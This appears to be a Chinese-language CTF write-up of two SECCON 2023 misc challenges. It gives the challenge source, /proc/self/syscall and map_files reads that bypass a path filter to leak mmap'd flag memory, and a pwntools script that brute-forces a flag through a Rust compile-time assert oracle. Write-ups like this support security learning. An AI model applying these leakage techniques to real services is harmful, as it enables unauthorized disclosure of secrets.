---
comment: True
---

# SECCON CTF 2023 Quals Writeup

!!! abstract
    第二次打 SECCON，时间比去年早，misc 题目比较少，后面还看了点 pwn。

    24h 比赛，打了第三，进决赛了。

---

## Readme 2023
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

??? question "题目源码"
    ```python
    import mmap
    import os
    import signal

    signal.alarm(60)

    try:
        f = open("./flag.txt", "r")
        mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
    except FileNotFoundError:
        print("[-] Flag does not exist")
        exit(1)

    while True:
        path = input("path: ")

        if 'flag.txt' in path:
            print("[-] Path not allowed")
            exit(1)
        elif 'fd' in path:
            print("[-] No more fd trick ;)")
            exit(1)

        with open(os.path.realpath(path), "rb") as f:
            print(f.read(0x100))
    ```

很有 SECCON 味道的一道题，题目源码就是很简单的 python。

这里 mmap.mmap 就是调的系统调用，将 flag.txt 映射到了内存中。然后提供了任意文件头 0x100 字节的读取，要求文件路径中不能包含 flag.txt 和 fd。

所以思路就是通过 proc 文件系统来尝试读取内存。如果没有 0x100 字节的限制的话就可以直接在 /proc/self/maps 中读取 flag.txt 的位置，然后再通过 /proc/self/map_files/... 进行读取。

但实际上 maps 输出不到 flag.txt 的位置，所以就要想一些其他办法来得到它的地址。映射后的地址是在 libc 后的，所以它相对于 libc 基址的偏移应该是恒定的。所以就变成了得到 libc 地址的问题了。

maps 还是输出不到 libc，但是可以通过 /proc/self/syscall 来查看当前的系统调用，因为一直在等待输入，所以一直有一条 read 的 syscall，它输出的最后一个值就是 pc，也是在 libc 中的，所以本地 docker 跑几次计算一下偏移就可以了。

```text
path: /proc/self/syscall
b'0 0x7 0x55ad83fc2580 0x1000 0x2 0x0 0x0 0x7fff44d48b38 0x7fcbe603607d\n'
# 0x7fcbe603607d -> 0x7fcbe6120000 偏移 958339
```

```text
path: /proc/self/syscall
b'0 0x7 0x563f1e8376b0 0x400 0x2 0x0 0x0 0x7ffe63b78728 0x7f20e9db807d\n'
path: /proc/self/map_files/7f20e9ea2000-7f20e9ea3000
b'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\n'
```

---

## crabox
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

??? question "题目源码"
    ```python
    import sys
    import re
    import os
    import subprocess
    import tempfile

    FLAG = os.environ["FLAG"]
    assert re.fullmatch(r"SECCON{[_a-z0-9]+}", FLAG)
    os.environ.pop("FLAG")

    TEMPLATE = """
    fn main() {
        {{YOUR_PROGRAM}}

        /* Steal me: {{FLAG}} */
    }
    """.strip()

    print("""
    🦀 Compile-Time Sandbox Escape 🦀

    Input your program (the last line must start with __EOF__):
    """.strip(), flush=True)

    program = ""
    while True:
        line = sys.stdin.readline()
        if line.startswith("__EOF__"):
            break
        program += line
    if len(program) > 512:
        print("Your program is too long. Bye👋".strip())
        exit(1)

    source = TEMPLATE.replace("{{FLAG}}", FLAG).replace("{{YOUR_PROGRAM}}", program)

    with tempfile.NamedTemporaryFile(suffix=".rs") as file:
        file.write(source.encode())
        file.flush()

        try:
            proc = subprocess.run(
                ["rustc", file.name],
                cwd="/tmp",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2,
            )
            print(":)" if proc.returncode == 0 else ":(")
        except subprocess.TimeoutExpired:
            print("timeout")
    ```

在 Sandbox 分类里的一道题，比较 misc，考察的是 Rust 编译时宏的使用。

题目大意就是在提供的模板中插入 Rust 代码，并且里面有注释的 flag，server 只会编译这份代码并告诉你是否编译成功（无任何额外信息）。

所以目标也很明确，就是要一个字节一个字节泄漏出 flag 内容。以及只会编译不会运行，能在编译时进行的操作也就是宏了。而且 Rust 中过程宏只能在一个独立的 lib crate 中编写，不能在同一文件中编写并使用过程宏，所以肯定要用声明式宏。

最初的想法是利用宏调用括号可以是大括号的特性来将带有 flag 的注释传入宏中进行匹配处理。但是实际操作发现在这个时候注释就已经被替换掉了，也就是调用的参数是空的而不是一个注释。

所以剩下的方法就是直接读取当前文件，可以使用 `#!rust file!()` 宏获取当前文件名，使用 `#!rust include_str!()` 在编译时读取文件内容。接下来要实现的就是编译时的 assert，可以查到一种写法是可以用的：

```rust
macro_rules! compile_time_assert {
    ($condition:expr, $message:expr) => {
        const _: [(); 0 - !($condition) as usize] = [];
    };
}
compile_time_assert!(..., "");
```

接下来要解决的就是读取文件中任意位置的内容，如果是直接切片的话是不可能得到 const 的，不能在编译时这么搞，所以可以采用指向文件内容的裸指针来操作，即整个程序如下：

```rust
fn main() {
    const PTR: *const u8 = unsafe{ include_str!(file!()).as_ptr().offset(...) };
    macro_rules! compile_time_assert {
        ($condition:expr, $message:expr) => {
            const _: [(); 0 - !($condition) as usize] = [];
        };
    }
    compile_time_assert!(unsafe{ *(PTR) } == '?' as u8, "");

    /* Steal me: SECCON{dummy} */
}
```

这样只有对应 offset 是给定的字符才可以通过编译，否则不行。接下来就可以通过 flag 中的大写字母来得到 flag 内容对应的 offset，然后逐位枚举可行字符进行爆破就可以了。

??? success "exp"
    ```python
    from pwn import *

    # context(log_level="debug")

    temp = """
    const PTR: *const u8 = unsafe{include_str!(file!()).as_ptr().offset(__OFFSET__)};
        const COS: &str = include_str!(file!());
        macro_rules! compile_time_assert {
            ($condition:expr, $message:expr) => {
                const _: [(); 0 - !($condition) as usize] = [];
            };
        }
        compile_time_assert!(unsafe{*(PTR)} == __ASCII__, "1");
    __EOF__
    """.strip()

    offset = 378
    charset = "_abcdefghijklmnopqrstuvwxyz0123456789"
    flag = "SECCON{"

    for i in range(0, 17):
        for char in charset:
            c = str(ord(char))
            length = len(c)
            payload = temp.replace("__OFFSET__", str(offset + i)).replace("__ASCII__", c if length == 3 else c + " ")
            p = remote("crabox.seccon.games", 1337)
            p.sendlineafter(b"):\n", payload.encode())
            res = p.recvline()
            if b":)" in res:
                flag += char
                print(flag)
                break
            p.close()
    ```

flag: **SECCON{ctfe_i5_p0w3rful}**
